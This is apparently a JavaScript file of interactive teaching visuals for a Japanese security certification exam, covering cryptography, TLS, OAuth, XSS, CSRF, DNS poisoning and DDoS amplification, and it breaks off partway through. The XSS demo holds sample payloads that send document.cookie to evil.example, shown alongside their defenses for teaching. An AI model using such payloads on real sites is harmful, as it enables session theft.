/**
 * visuals/security.js - 情報処理安全確保支援士向けの体感ビジュアル
 */
(function (global) {
  'use strict';

  var V = global.Visuals;
  var ui = V.ui, h = ui.h, s = ui.s, clear = ui.clear, fmt = ui.fmt, metric = ui.metric;

  /* ------------------------------------------------------------------
   * 共通: シーケンス図(1ステップずつ進める)
   * actors: ['A', 'B', ...]
   * steps: [{from, to, label, note, cls}]   from === to なら自分の処理
   * ------------------------------------------------------------------ */
  function sequence(root, actors) {
    var steps = [], pos = 0;
    var svg = s('svg', { class: 'v-svg', role: 'img', 'aria-label': 'シーケンス図' });
    var note = h('div', { class: 'v-verdict' });
    var prevB = ui.button('← 前へ', function () { if (pos > 0) { pos--; draw(); } });
    var nextB = ui.button('次へ →', function () { if (pos < steps.length) { pos++; draw(); } }, 'primary');
    var allB = ui.button('最後まで', function () { pos = steps.length; draw(); });
    var resetB = ui.button('最初から', function () { pos = 0; draw(); });
    root.appendChild(svg);
    root.appendChild(note);
    root.appendChild(h('div', { class: 'v-row' }, [prevB, nextB, allB, resetB]));
    var W = 340, top = 34, rowH = 30;
    function X(i) { return 20 + (W - 40) * (actors.length === 1 ? 0.5 : i / (actors.length - 1)); }
    function draw() {
      var H = top + Math.max(steps.length, 1) * rowH + 14;
      svg.setAttribute('viewBox', '0 0 ' + W + ' ' + H);
      clear(svg);
      svg.appendChild(s('defs', null, s('marker', { id: 'v-arr-seq', viewBox: '0 0 10 10', refX: 9, refY: 5, markerWidth: 6, markerHeight: 6, orient: 'auto' }, s('path', { d: 'M0,0L10,5L0,10z', class: 'v-arrowhead' }))));
      actors.forEach(function (a, i) {
        svg.appendChild(s('line', { x1: X(i), y1: 24, x2: X(i), y2: H - 4, class: 'v-guide' }));
        svg.appendChild(s('text', { x: X(i), y: 14, class: 'v-node-label', 'text-anchor': i === 0 ? 'start' : i === actors.length - 1 ? 'end' : 'middle', text: a }));
      });
      steps.slice(0, pos).forEach(function (st, k) {
        var y = top + k * rowH + 12;
        var cls = 'v-edge' + (st.cls ? ' ' + st.cls : '') + (k === pos - 1 ? ' cur' : '');
        var x1 = X(st.from), x2 = X(st.to);
        if (st.from === st.to) {
          svg.appendChild(s('rect', { x: x1 - 6, y: y - 9, width: 12, height: 16, rx: 3, class: 'v-self' + (st.cls ? ' ' + st.cls : '') }));
          var right = st.from < actors.length - 1 || actors.length === 1;
          svg.appendChild(s('text', { x: x1 + (right ? 10 : -10), y: y + 3, class: 'v-tick strong' + (st.cls ? ' ' + st.cls : ''), 'text-anchor': right ? 'start' : 'end', text: st.label }));
        } else {
          svg.appendChild(s('line', { x1: x1, y1: y, x2: x2 + (x2 > x1 ? -2 : 2), y2: y, class: cls, 'marker-end': 'url(#v-arr-seq)' }));
          svg.appendChild(s('text', { x: (x1 + x2) / 2, y: y - 4, class: 'v-tick strong' + (st.cls ? ' ' + st.cls : ''), 'text-anchor': 'middle', text: st.label }));
        }
      });
      var cur = steps[pos - 1];
      note.className = 'v-verdict' + (cur && cur.tone ? ' ' + cur.tone : '');
      note.textContent = cur ? (pos + '. ' + cur.note) : '「次へ」で1ステップずつ進めます(全' + steps.length + 'ステップ)。';
      prevB.disabled = pos === 0; nextB.disabled = pos >= steps.length;
    }
    return {
      set: function (list, keepPos) { steps = list; pos = keepPos ? Math.min(pos, steps.length) : 0; draw(); },
      showAll: function () { pos = steps.length; draw(); }
    };
  }

  /** 決定的な疑似ハッシュ(表示用) */
  function mix(x) {
    x = (x ^ 61) ^ (x >>> 16); x = (x + (x << 3)) | 0; x ^= x >>> 4; x = Math.imul(x, 0x27d4eb2d); x ^= x >>> 15;
    return x >>> 0;
  }

  /* ------------------------------------------------------------------
   * ECB と CBC
   * ------------------------------------------------------------------ */
  V.register('ecb', {
    title: 'ECB モードでは模様が透けて見える',
    desc: '1マス = 1ブロック。同じ色(同じ平文ブロック)が ECB では同じ暗号文になり、絵の形がそのまま残ります。CBC では前のブロックと連鎖するので模様が消えます。',
    mount: function (root) {
      var art = [
        '................',
        '.....######.....',
        '...##########...',
        '..###oo##oo###..',
        '..###oo##oo###..',
        '..############..',
        '..##x######x##..',
        '...##xxxxxx##...',
        '.....######.....',
        '................'
      ];
      var key = 7;
      var grids = h('div', { class: 'v-ecb' });
      var COLORS = { '.': 0, '#': 1, 'o': 2, 'x': 3 };
      function grid(title, colorOf) {
        var g = s('svg', { viewBox: '0 0 160 100', class: 'v-svg', role: 'img', 'aria-label': title });
        art.forEach(function (row, y) {
          row.split('').forEach(function (c, x) {
            g.appendChild(s('rect', { x: x * 10, y: y * 10, width: 10, height: 10, style: 'fill:' + colorOf(c, x, y) }));
          });
        });
        return h('figure', { class: 'v-ecb-fig' }, [g, h('figcaption', { text: title })]);
      }
      function hue(v) { return 'hsl(' + (v % 360) + ',' + (45 + (v >> 9) % 40) + '%,' + (35 + (v >> 17) % 35) + '%)'; }
      function draw() {
        clear(grids);
        var PLAIN = ['#e9eef6', '#f5b301', '#1b2130', '#d9455a'];
        grids.appendChild(grid('平文(画像)', function (c) { return PLAIN[COLORS[c]]; }));
        grids.appendChild(grid('ECB で暗号化', function (c) { return hue(mix(COLORS[c] * 7919 + key * 104729)); }));
        var prev = mix(key * 31337 + 1);
        var cbc = {};
        art.forEach(function (row, y) { row.split('').forEach(function (c, x) { prev = mix((COLORS[c] + 1) * 2654435761 ^ prev ^ key); cbc[x + ',' + y] = prev; }); });
        grids.appendChild(grid('CBC で暗号化', function (c, x, y) { return hue(cbc[x + ',' + y]); }));
      }
      root.appendChild(grids);
      root.appendChild(h('div', { class: 'v-row' }, ui.button('鍵を変える', function () { key = (key * 7 + 13) % 1000; draw(); }, 'primary')));
      root.appendChild(h('p', { class: 'v-caption', text: '鍵を変えても ECB では「同じ色は同じ色」のまま。暗号文の色が何であれ、形(どこが同じ平文か)が漏れてしまう。' }));
      draw();
    }
  });

  /* ------------------------------------------------------------------
   * Diffie-Hellman
   * ------------------------------------------------------------------ */
  function modpow(b, e, m) { var r = 1; b %= m; while (e > 0) { if (e & 1) r = r * b % m; b = b * b % m; e >>= 1; } return r; }

  V.register('dh', {
    title: 'Diffie-Hellman で鍵を共有する(小さな数で体験)',
    desc: 'p = 23、g = 5 で計算します。アリスとボブの秘密の値を動かしても、2人が計算する共有鍵は必ず一致します。',
    mount: function (root) {
      var P = 23, G = 5, mode = 'normal';
      var a = ui.slider({ label: 'アリスの秘密の値 a', min: 2, max: 21, value: 6, onInput: draw });
      var b = ui.slider({ label: 'ボブの秘密の値 b', min: 2, max: 21, value: 15, onInput: draw });
      var seg = ui.segmented([{ value: 'normal', label: '盗聴者イブがいる' }, { value: 'mitm', label: '中間者マロリーが割り込む' }], mode, function (v) { mode = v; draw(); });
      var board = h('div', { class: 'v-dh' });
      var verdict = h('div', { class: 'v-verdict' });
      function card(title, lines, cls) {
        return h('div', { class: 'v-dh-card ' + (cls || '') }, [h('div', { class: 'v-label', text: title })].concat(lines.map(function (l) { return h('div', { class: 'mono', text: l }); })));
      }
      function draw() {
        var A = modpow(G, a.value, P), B = modpow(G, b.value, P);
        clear(board);
        if (mode === 'normal') {
          var ka = modpow(B, a.value, P), kb = modpow(A, b.value, P);
          board.appendChild(card('アリス', ['秘密 a = ' + a.value, '公開値 A = 5^' + a.value + ' mod 23 = ' + A, '鍵 = B^a mod 23 = ' + ka], 'alice'));
          board.appendChild(card('通信路(イブが盗聴)', ['p = 23, g = 5', 'A = ' + A + ' →', '← B = ' + B, '(a・b・鍵は流れない)'], 'wire'));
          board.appendChild(card('ボブ', ['秘密 b = ' + b.value, '公開値 B = 5^' + b.value + ' mod 23 = ' + B, '鍵 = A^b mod 23 = ' + kb], 'bob'));
          verdict.className = 'v-verdict ok';
          verdict.textContent = '共有鍵 ' + ka + ' が一致!イブは A と B を見ても、a や b を求める(離散対数問題)のが困難。実際の p は2048ビット以上なので総当たりは不可能。';
        } else {
          var m = 9, M = modpow(G, m, P);
          var k1 = modpow(M, a.value, P), k2 = modpow(M, b.value, P);
          board.appendChild(card('アリス', ['公開値 A = ' + A, '受け取った値 = ' + M + '(実はマロリー)', '鍵 = ' + k1], 'alice'));
          board.appendChild(card('マロリー', ['A, B を横取りし、自分の値 ' + M + ' を両方に送る', 'アリスとの鍵 = ' + k1, 'ボブとの鍵 = ' + k2], 'mallory'));
          board.appendChild(card('ボブ', ['公開値 B = ' + B, '受け取った値 = ' + M + '(実はマロリー)', '鍵 = ' + k2], 'bob'));
          verdict.className = 'v-verdict ng';
          verdict.textContent = 'アリスとボブはそれぞれマロリーと鍵を共有してしまい、気づけない。DH 単体には相手の認証がないため。TLS では公開値にサーバの署名(証明書)を付けて防ぐ。';
        }
      }
      root.appendChild(seg.el); root.appendChild(a.el); root.appendChild(b.el); root.appendChild(board); root.appendChild(verdict);
      draw();
    }
  });

  /* ------------------------------------------------------------------
   * パスワードの総当たり時間
   * ------------------------------------------------------------------ */
  V.register('pwcrack', {
    title: 'パスワードの長さ・文字種と総当たりの時間',
    desc: '桁数と文字の種類で組合せ数が決まります。保存方式(ハッシュの速さ)を変えると、オフラインで総当たりされたときの時間が大きく変わります。',
    mount: function (root) {
      var len = ui.slider({ label: '桁数', min: 4, max: 16, value: 8, fmt: function (v) { return v + ' 文字'; }, onInput: draw });
      var cs = 62;
      var csSeg = ui.segmented([{ value: 10, label: '数字のみ(10)' }, { value: 26, label: '英小文字(26)' }, { value: 62, label: '英大小+数字(62)' }, { value: 94, label: '記号も(94)' }], cs, function (v) { cs = v; draw(); });
      var speed = 1e10;
      var spSeg = ui.segmented([{ value: 1e10, label: '高速ハッシュ(GPU 100億回/秒)' }, { value: 1e4, label: 'bcrypt 等(1万回/秒)' }, { value: 0.1, label: 'オンライン+ロック(6回/分)' }], speed, function (v) { speed = v; draw(); });
      var metrics = h('div', { class: 'v-metrics' });
      var bar = h('div', { class: 'v-progress' }, h('span'));
      function human(sec) {
        if (sec < 1) return '1秒未満';
        var units = [['年', 31536000], ['日', 86400], ['時間', 3600], ['分', 60], ['秒', 1]];
        for (var i = 0; i < units.length; i++) {
          if (sec >= units[i][1]) {
            var v = sec / units[i][1];
            if (units[i][0] === '年' && v >= 1e4) return v.toExponential(1).replace('e+', ' × 10^') + ' 年';
            return fmt(v, 1) + ' ' + units[i][0];
          }
        }
        return fmt(sec, 1) + ' 秒';
      }
      function draw() {
        var combos = Math.pow(cs, len.value);
        var sec = combos / speed;
        clear(metrics);
        metrics.appendChild(metric('組合せ数 ' + cs + '^' + len.value, combos >= 1e6 ? combos.toExponential(2).replace('e+', ' × 10^') : String(combos)));
        metrics.appendChild(metric('すべて試すのにかかる時間', human(sec), sec < 86400 * 30 ? 'neg' : 'good'));
        var span = bar.firstChild;
        var lg = Math.max(0, Math.min(1, Math.log10(Math.max(sec, 1)) / 12));
        span.style.width = (lg * 100) + '%';
        span.textContent = '強さの目安';
        span.style.background = lg < 0.6 ? 'var(--danger)' : lg < 0.8 ? '#e8860c' : 'var(--success)';
      }
      root.appendChild(len.el); root.appendChild(csSeg.el); root.appendChild(spSeg.el);
      root.appendChild(metrics); root.appendChild(bar);
      root.appendChild(h('p', { class: 'v-caption', text: 'ソルトがないと、よくあるパスワードは事前計算表(レインボーテーブル)で一瞬で割れる。ソルトで事前計算を無効にし、ストレッチング(bcrypt 等)で1回あたりの計算を遅くする。パスワードリスト攻撃には長さも効かないので、多要素認証が必要。' }));
      draw();
    }
  });

  /* ------------------------------------------------------------------
   * OAuth 2.0 認可コードフロー
   * ------------------------------------------------------------------ */
  V.register('oauth', {
    title: 'OAuth 2.0 認可コードフロー(PKCE 付き)',
    desc: '写真印刷アプリ(クライアント)が、利用者の写真ストレージにアクセスする流れです。パスワードがどこに入力され、どこに渡らないかに注目してください。',
    mount: function (root) {
      var seq = sequence(root, ['ブラウザ', 'アプリ', '認可サーバ', 'API']);
      seq.set([
        { from: 0, to: 1, label: '「写真を連携」', note: '利用者が、アプリで写真ストレージとの連携ボタンを押す。' },
        { from: 1, to: 0, label: 'リダイレクト', note: 'アプリはブラウザを認可サーバへリダイレクトする。URL に client_id、要求する権限(scope)、CSRF 対策の state、PKCE の code_challenge(秘密の値のハッシュ)を付ける。' },
        { from: 0, to: 2, label: 'ログイン・同意', note: '利用者は認可サーバの画面でログインし、権限の付与に同意する。パスワードを入力するのは認可サーバだけで、アプリには渡らない。', tone: 'ok' },
        { from: 2, to: 0, label: '認可コード', note: '認可サーバは、短時間だけ有効な認可コードを付けて、ブラウザをアプリへリダイレクトする。' },
        { from: 0, to: 1, label: 'code, state', note: 'アプリは state が自分の発行した値と一致するか確認する(CSRF 対策)。' },
        { from: 1, to: 2, label: 'code + verifier', note: 'アプリは認可コードと、code_challenge の元になった秘密の値(code_verifier)を認可サーバに送る。認可コードを横取りされても、verifier を知らない攻撃者はトークンを取れない(PKCE)。' },
        { from: 2, to: 1, label: 'アクセストークン', note: '認可サーバは検証に成功すると、アクセストークン(と必要に応じてリフレッシュトークン)を発行する。', tone: 'ok' },
        { from: 1, to: 3, label: 'API + トークン', note: 'アプリはアクセストークンを付けて API を呼ぶ。トークンには許可された範囲(scope)と有効期限がある。利用者のパスワードは最後までアプリに渡っていない。', tone: 'ok' }
      ]);
    }
  });

  /* ------------------------------------------------------------------
   * TLS 1.3 ハンドシェイク
   * ------------------------------------------------------------------ */
  V.register('tlshs', {
    title: 'TLS 1.3 ハンドシェイクと中間者攻撃',
    desc: '状況を切り替えて、ハンドシェイクを1ステップずつ進めてください。証明書の検証がどこで効くのかがわかります。',
    mount: function (root) {
      var mode = 'normal';
      var seg = ui.segmented([{ value: 'normal', label: '正常な接続' }, { value: 'mitm', label: '中間者(検証あり)' }, { value: 'skip', label: '中間者(検証を省略)' }], mode, function (v) { mode = v; build(); });
      root.appendChild(seg.el);
      var seq = sequence(root, ['クライアント', 'サーバ']);
      function build() {
        var fake = mode !== 'normal';
        var steps = [
          { from: 0, to: 1, label: 'ClientHello', note: '対応する暗号スイートと、鍵交換用の公開値(key_share)を送る。TLS 1.3 では最初から鍵交換の値を送るので1往復で済む。' },
          { from: 1, to: 0, label: 'ServerHello', note: '選んだ暗号スイートと、サーバ側の公開値を返す。ここで双方が (EC)DHE で同じ鍵を計算でき、以降のメッセージは暗号化される。' + (fake ? '(実は相手は中間者で、中間者の公開値が届いている)' : '') },
          { from: 1, to: 0, label: fake ? '{Certificate} 偽' : '{Certificate}', cls: fake ? 'bad' : '', note: fake ? '中間者は本物のサーバの秘密鍵を持たないので、自分で用意した証明書を送るしかない(信頼された CA の、そのホスト名の証明書は入手できない)。' : 'サーバ証明書(と中間 CA 証明書)を送る。ここから暗号化されているので、証明書も盗聴者には見えない。' },
          { from: 1, to: 0, label: '{CertificateVerify}', note: 'それまでのハンドシェイク全体に、証明書の秘密鍵で署名する。これで「公開値を送ってきた相手が証明書の持ち主である」ことが証明される。' },
          { from: 1, to: 0, label: '{Finished}', note: 'ハンドシェイクの内容全体の MAC。途中で改ざん(ダウングレードなど)されていないことを確認する。' }
        ];
        if (mode === 'normal') {
          steps.push({ from: 0, to: 0, label: '証明書を検証 ✓', note: '署名の連鎖(ルート CA まで)、有効期間、ホスト名の一致、失効していないことを確認。すべて OK。', tone: 'ok', cls: 'good' });
          steps.push({ from: 0, to: 1, label: '{Finished}', note: 'クライアントも Finished を送り、ハンドシェイク完了。' });
          steps.push({ from: 0, to: 1, label: '[アプリデータ]', note: 'AEAD で暗号化・改ざん検知されたアプリケーションデータをやり取りする。鍵は使い捨てなので前方秘匿性もある。', tone: 'ok', cls: 'good' });
        } else if (mode === 'mitm') {
          steps.push({ from: 0, to: 0, label: '検証失敗 ✕ → 中止', note: '信頼できる CA の署名がない、またはホスト名が一致しないので検証に失敗し、接続を中止する。ブラウザは警告画面を出す。利用者が警告を無視して進むと、中間者攻撃が成立してしまう。', tone: 'ok', cls: 'bad' });
        } else {
          steps.push({ from: 0, to: 0, label: '検証せず続行', note: 'アプリの実装が証明書の検証を省略(すべて信頼)している。偽の証明書でも接続してしまう。', tone: 'ng', cls: 'bad' });
          steps.push({ from: 0, to: 1, label: '[データ] → 中間者', note: '暗号化はされているが、鍵を共有した相手は中間者。中間者は復号して内容を読み、改ざんして本物のサーバに中継できる。暗号化だけでは安全にならない。', tone: 'ng', cls: 'bad' });
        }
        seq.set(steps);
      }
      build();
    }
  });

  /* ------------------------------------------------------------------
   * XSS
   * ------------------------------------------------------------------ */
  V.register('xss', {
    title: 'XSS の対策をオン・オフして結果を比べる',
    desc: '掲示板への投稿を、そのまま HTML に出力するページです。3つの対策を切り替えて、攻撃がどこで止まるかを確かめてください(実際にスクリプトは実行しません)。',
    mount: function (root) {
      var input = h('input', { type: 'text', class: 'v-text', value: '<script>new Image().src="https://evil.example/?c="+document.cookie</script>', 'aria-label': '投稿内容' });
      var opts = { esc: false, http: false, csp: false };
      var toggles = h('div', { class: 'v-row' });
      var code = h('pre', { class: 'v-code' });
      var steps = h('ol', { class: 'v-log' });
      var verdict = h('div', { class: 'v-verdict' });
      var presets = h('div', { class: 'v-row' });
      [['スクリプト', '<script>new Image().src="https://evil.example/?c="+document.cookie</script>'], ['img の onerror', '<img src=x onerror="location=\'https://evil.example/?c=\'+document.cookie">'], ['普通の投稿', '今日の勉強会は 18:00 から!']].forEach(function (p) {
        presets.appendChild(ui.button(p[0], function () { input.value = p[1]; draw(); }, 'ghost'));
      });
      function tg(key, label) {
        return h('button', { type: 'button', class: 'v-key' + (opts[key] ? ' is-on' : ''), onclick: function () { opts[key] = !opts[key]; draw(); } }, (opts[key] ? '✓ ' : '') + label);
      }
      function esc(t) { return t.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
      function draw() {
        clear(toggles);
        toggles.appendChild(tg('esc', '出力時にエスケープ'));
        toggles.appendChild(tg('http', 'Cookie に HttpOnly'));
        toggles.appendChild(tg('csp', 'CSP(インライン禁止)'));
        var v = input.value;
        var out = opts.esc ? esc(v) : v;
        code.textContent = '<div class="post">' + out + '</div>';
        var hasScript = /<script|on\w+\s*=|javascript:/i.test(v);
        clear(steps);
        var tone, msg;
        if (!hasScript) {
          steps.appendChild(h('li', { text: 'スクリプトを含まない普通の文字列なので、そのまま表示される。' }));
          tone = 'ok'; msg = '問題なし。でも攻撃者は普通の文字列を送ってこない。';
        } else if (opts.esc) {
          steps.appendChild(h('li', { class: 'v-ok', text: '< > " が &lt; &gt; &quot; に変換され、ただの文字として表示される。' }));
          tone = 'ok'; msg = '根本対策で防げた。タグとして解釈されないので、何も実行されない。';
        } else {
          steps.appendChild(h('li', { class: 'v-err', text: '投稿がそのまま HTML のタグとして解釈される。' }));
          if (opts.csp) {
            steps.appendChild(h('li', { class: 'v-ok', text: 'CSP がインラインスクリプト(script タグ内・イベント属性)の実行をブロック。' }));
            tone = 'warn'; msg = 'CSP で実行は止まった(多層防御)。ただし HTML の注入自体は起きているので、偽のフォームの表示などは防げない。根本対策はエスケープ。';
          } else {
            steps.appendChild(h('li', { class: 'v-err', text: '閲覧者のブラウザでスクリプトが実行される。' }));
            if (opts.http) {
              steps.appendChild(h('li', { class: 'v-ok', text: 'HttpOnly のため document.cookie にセッション ID が含まれず、窃取は失敗。' }));
              tone = 'warn'; msg = 'セッション ID は守れたが、スクリプトは動いている。画面の書換え、利用者になりすました操作の送信などの被害は残る。';
            } else {
              steps.appendChild(h('li', { class: 'v-err', text: 'document.cookie の SESSID=… が evil.example に送信される。' }));
              tone = 'ng'; msg = 'セッション ID を盗まれ、攻撃者が利用者になりすませる。';
            }
          }
        }
        verdict.className = 'v-verdict ' + tone;
        verdict.textContent = msg;
      }
      input.addEventListener('input', draw);
      root.appendChild(presets); root.appendChild(input); root.appendChild(toggles);
      root.appendChild(h('div', { class: 'v-label', text: 'サーバが出力する HTML' })); root.appendChild(code);
      root.appendChild(steps); root.appendChild(verdict);
      draw();
    }
  });

  /* ------------------------------------------------------------------
   * CSRF
   * ------------------------------------------------------------------ */
  V.register('csrf', {
    title: 'CSRF 攻撃の流れと対策',
    desc: '対策を選んでから流れを進めてください。最後のステップで、正規サイトがリクエストを受け入れるかどうかが変わります。',
    mount: function (root) {
      var mode = 'none';
      var seg = ui.segmented([{ value: 'none', label: '対策なし' }, { value: 'token', label: 'トークンを照合' }, { value: 'samesite', label: 'SameSite=Lax' }], mode, function (v) { mode = v; build(); });
      root.appendChild(seg.el);
      var seq = sequence(root, ['利用者のブラウザ', '罠サイト', '正規サイト']);
      function build() {
        var steps = [
          { from: 0, to: 2, label: 'ログイン', note: '利用者は正規サイト(銀行や EC サイト)にログインし、セッション ID の Cookie を受け取る。' + (mode === 'token' ? '送金フォームには推測困難なトークンが埋め込まれている。' : '') },
          { from: 0, to: 1, label: '罠ページを開く', note: 'ログインしたまま、メールや SNS のリンクから罠サイトを開いてしまう。' },
          { from: 1, to: 0, label: '自動送信フォーム', note: '罠ページには、正規サイトの送金処理あての隠しフォームと、それを自動で送信するスクリプトがある。' },
          { from: 0, to: 2, label: mode === 'samesite' ? 'POST(Cookie なし)' : 'POST + Cookie', cls: 'bad', note: mode === 'samesite' ? 'SameSite=Lax の Cookie は、他サイトから始まった POST リクエストには付かない。' : 'ブラウザは正規サイトあてのリクエストに Cookie を自動で付ける。正規サイトからは、本人の操作と区別がつかない。' }
        ];
        if (mode === 'none') steps.push({ from: 2, to: 2, label: '送金を実行 ✕', cls: 'bad', tone: 'ng', note: 'セッション ID が有効なので処理してしまう。利用者の意図しない送金が成立した。' });
        else if (mode === 'token') steps.push({ from: 2, to: 2, label: 'トークン不一致 → 拒否', cls: 'good', tone: 'ok', note: '罠サイトは正規フォームのトークンを知り得ないので、トークンがない(一致しない)リクエストを拒否できた。' });
        else steps.push({ from: 2, to: 2, label: '未ログイン扱い → 拒否', cls: 'good', tone: 'ok', note: 'Cookie が付いていないので未ログインとして扱われ、送金されない。ただし古いブラウザや GET での更新処理には効かない場合があるので、トークンと併用する。' });
        seq.set(steps);
      }
      build();
    }
  });

  /* ------------------------------------------------------------------
   * DNS キャッシュポイズニング
   * ------------------------------------------------------------------ */
  V.register('dnspoison', {
    title: 'キャッシュポイズニングが成功する確率',
    desc: '偽の応答は、トランザクション ID(16ビット)と送信元ポートの両方が一致しないと受け入れられません。ポートのランダム化と DNSSEC の効果を確かめましょう。',
    mount: function (root) {
      var port = 'fixed', dnssec = false;
      var seg = ui.segmented([{ value: 'fixed', label: '送信元ポート固定' }, { value: 'random', label: 'ポートをランダム化' }], port, function (v) { port = v; draw(); });
      var secBtn = h('button', { type: 'button', class: 'v-key', onclick: function () { dnssec = !dnssec; draw(); } });
      var forged = ui.slider({ label: '1回の試行で送る偽応答の数', min: 10, max: 1000, step: 10, value: 200, fmt: function (v) { return v + ' 個'; }, onInput: draw });
      var tries = ui.slider({ label: '試行回数(カミンスキー攻撃なら何度でも試せる)', min: 1, max: 5000, step: 1, value: 100, fmt: function (v) { return v + ' 回'; }, onInput: draw });
      var metrics = h('div', { class: 'v-metrics' });
      var bar = h('div', { class: 'v-progress' }, h('span'));
      var verdict = h('div', { class: 'v-verdict' });
      function draw() {
        secBtn.className = 'v-key' + (dnssec ? ' is-on' : '');
        secBtn.textContent = (dnssec ? '✓ ' : '') + 'DNSSEC で署名を検証';
        var space = 65536 * (port === 'random' ? 60000 : 1);
        var p1 = Math.min(1, forged.value / space);
        var total = dnssec ? 0 : 1 - Math.pow(1 - p1, tries.value);
        clear(metrics);
        metrics.appendChild(metric('推測すべき組合せ', port === 'random' ? '65,536 × 約60,000 ≒ 39億' : '65,536(ID のみ)'));
        metrics.appendChild(metric('1回の試行で成功する確率', dnssec ? '0(署名で検出)' : fmt(p1 * 100, 4) + '%'));
        metrics.appendChild(metric('全試行での成功確率', fmt(total * 100, 2) + '%', total > 0.5 ? 'neg' : 'good'));
        var span = bar.firstChild;
        span.style.width = (total * 100) + '%';
        span.style.background = 'var(--danger)';
        span.textContent = total > 0.08 ? '汚染される確率' : '';
        verdict.className = 'v-verdict ' + (total > 0.5 ? 'ng' : total > 0.01 ? 'warn' : 'ok');
        verdict.textContent = dnssec ? 'DNSSEC では偽の応答に正しい署名を付けられないので、ID とポートが当たっても受け入れられない。'
          : port === 'fixed' ? 'ID は16ビットしかないので、何度も試せるカミンスキー攻撃ではほぼ確実に当たってしまう。'
            : 'ポートのランダム化で推測空間が約6万倍に広がり、成功確率が大きく下がった。ただしゼロではない。';
      }
      root.appendChild(seg.el); root.appendChild(h('div', { class: 'v-row' }, secBtn));
      root.appendChild(forged.el); root.appendChild(tries.el);
      root.appendChild(metrics); root.appendChild(bar); root.appendChild(verdict);
      draw();
    }
  });

  /* ------------------------------------------------------------------
   * リフレクション(アンプ)攻撃
   * ------------------------------------------------------------------ */
  V.register('amp', {
    title: 'リフレクション攻撃の増幅',
    desc: '送信元を詐称した小さな要求が、踏み台のサーバで何十倍にもふくらんで攻撃対象に届きます。',
    mount: function (root) {
      var factor = 50;
      var seg = ui.segmented([{ value: 50, label: 'DNS(約50倍)' }, { value: 550, label: 'NTP monlist(約550倍)' }, { value: 10000, label: 'memcached(1万倍超)' }], factor, function (v) { factor = v; draw(); });
      var bots = ui.slider({ label: '攻撃者(ボット)の数', min: 10, max: 2000, step: 10, value: 200, fmt: function (v) { return v + ' 台'; }, onInput: draw });
      var up = ui.slider({ label: '1台あたりの送信帯域', min: 1, max: 20, value: 2, fmt: function (v) { return v + ' Mbps'; }, onInput: draw });
      var line = ui.slider({ label: '攻撃対象の回線の帯域', min: 1, max: 100, value: 10, fmt: function (v) { return v + ' Gbps'; }, onInput: draw });
      var svg = s('svg', { viewBox: '0 0 340 90', class: 'v-svg', role: 'img', 'aria-label': '攻撃量と回線容量の比較' });
      var metrics = h('div', { class: 'v-metrics' });
      function draw() {
        var req = bots.value * up.value / 1000, atk = req * factor;
        var max = Math.max(atk, line.value) * 1.1;
        clear(svg);
        [['要求', req, 'ev'], ['攻撃', atk, 'ac'], ['回線', line.value, 'pv']].forEach(function (r, i) {
          var y = 8 + i * 26, w = Math.max(1, r[1] / max * 250);
          svg.appendChild(s('text', { x: 4, y: y + 15, class: 'v-node-label', text: r[0] }));
          svg.appendChild(s('rect', { x: 40, y: y, width: w, height: 20, rx: 4, class: 'v-evbar ' + r[2] }));
          svg.appendChild(s('text', { x: 44 + w, y: y + 15, class: 'v-tick', text: fmt(r[1], 1) + ' Gbps' }));
        });
        clear(metrics);
        metrics.appendChild(metric('攻撃者が送る量', fmt(req, 2) + ' Gbps'));
        metrics.appendChild(metric('攻撃対象に届く量', fmt(atk, 1) + ' Gbps', atk > line.value ? 'neg' : ''));
        metrics.appendChild(metric('回線', atk > line.value ? '飽和(サービス停止)' : '耐えられる', atk > line.value ? 'neg' : 'good'));
      }
      root.appendChild(seg.el); root.appendChild(bots.el); root.appendChild(up.el); root.appendChild(line.el);
      root.appendChild(svg); root.appendChild(metrics);
      root.appendChild(h('p', { class: 'v-caption', text: '自組織の DNS サーバをオープンリゾルバにしない(踏み台にならない)、ISP で送信元詐称パケットを遮断する(イングレスフィルタリング)ことが対策。' }));
      draw();
    }
  });

  /* ------------------------------------------------------------------
   * ファイアウォールのルール順
   * ------------------------------------------------------------------ */
  V.register('fwrule', {
    title: 'ファイアウォールのルールを並べ替えて正しくする',
    desc: 'ルールは上から評価され、最初に一致したものが適用されます。今のルールには誤りがあります。↑↓で順番を入れ替えたり、許可/拒否を切り替えたりして、すべてのパケットを期待どおりにしてください。',
    mount: function (root) {
      var rules = [
        { act: 'allow', src: 'any', dst: 'any', port: '443' },
        { act: 'deny', src: '外部', dst: '内部PC', port: 'any' },
        { act: 'allow', src: '内部PC', dst: 'Webサーバ', port: '22' }
      ];
      var packets = [
        { src: '外部', dst: 'Webサーバ', port: '443', want: 'allow', note: '公開 Web' },
        { src: '外部', dst: 'Webサーバ', port: '22', want: 'deny', note: '外からの SSH' },
        { src: '外部', dst: '内部PC', port: '443', want: 'deny', note: '外から内部へ' },
        { src: '内部PC', dst: '外部', port: '443', want: 'allow', note: '社内からの Web 閲覧' },
        { src: '内部PC', dst: 'Webサーバ', port: '22', want: 'allow', note: '管理者の保守' },
        { src: '外部', dst: '内部PC', port: '3389', want: 'deny', note: '外からの RDP' }
      ];
      var tableBox = h('div', { class: 'v-scroll' });
      var pktBox = h('div', { class: 'v-scroll' });
      var verdict = h('div', { class: 'v-verdict' });
      function match(r, p) { return (r.src === 'any' || r.src === p.src) && (r.dst === 'any' || r.dst === p.dst) && (r.port === 'any' || r.port === p.port); }
      function judge(p) {
        for (var i = 0; i < rules.length; i++) if (match(rules[i], p)) return { act: rules[i].act, by: 'ルール' + (i + 1) };
        return { act: 'deny', by: '暗黙の拒否' };
      }
      function draw() {
        var t = h('table', { class: 'v-table' }, h('tr', null, ['#', '動作', '送信元', '宛先', 'ポート', '並べ替え'].map(function (x) { return h('th', { text: x }); })));
        rules.forEach(function (r, i) {
          t.appendChild(h('tr', null, [
            h('td', { text: i + 1 }),
            h('td', null, h('button', { type: 'button', class: 'v-key mini-key ' + (r.act === 'allow' ? 'is-on' : 'deny'), onclick: function () { r.act = r.act === 'allow' ? 'deny' : 'allow'; draw(); } }, r.act === 'allow' ? '許可' : '拒否')),
            h('td', { text: r.src }), h('td', { text: r.dst }), h('td', { text: r.port }),
            h('td', null, [
              ui.button('↑', function () { if (i > 0) { var x = rules[i - 1]; rules[i - 1] = r; rules[i] = x; draw(); } }, 'mini'),
              ui.button('↓', function () { if (i < rules.length - 1) { var x = rules[i + 1]; rules[i + 1] = r; rules[i] = x; draw(); } }, 'mini')
            ])
          ]));
        });
